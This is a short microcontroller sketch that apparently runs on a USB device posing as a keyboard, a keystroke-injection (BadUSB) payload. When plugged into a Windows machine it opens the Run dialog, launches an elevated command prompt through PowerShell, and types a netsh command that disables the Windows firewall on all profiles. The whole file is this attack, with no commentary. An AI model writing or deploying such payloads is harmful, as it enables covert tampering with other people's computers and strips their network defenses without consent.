#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println("powershell Start-Process cmd -Verb RunAs");
  delay(1000);
  Keyboard.println("netsh advfirewall set allprofiles state off");
}

void loop() {}
